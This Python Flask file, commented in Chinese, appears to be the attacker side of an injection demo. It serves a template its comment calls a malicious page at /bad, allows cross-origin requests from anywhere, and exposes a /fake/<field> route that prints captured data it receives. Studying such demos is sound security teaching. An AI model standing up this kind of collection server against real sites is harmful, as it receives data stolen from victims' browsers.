# -*- coding: utf-8 -*-
from flask import Flask, render_template
from flask_cors import CORS

# Flask框架App
app = Flask(__name__)

# 服务器允许跨域访问
CORS(app, resources=r'/*')


# 提供恶意页面
@app.route('/bad', methods=['GET', 'POST'])
def bad_page():
    return render_template("inject.html")


# 路由地址，假设存储监听到的内容
@app.route('/fake/<field>', methods=['POST'])
def capture_info(field):
    print('假数据库存储: ' + field)
    return '200OK'  # 用以测试通路


if __name__ == '__main__':
    app.run(debug=True)
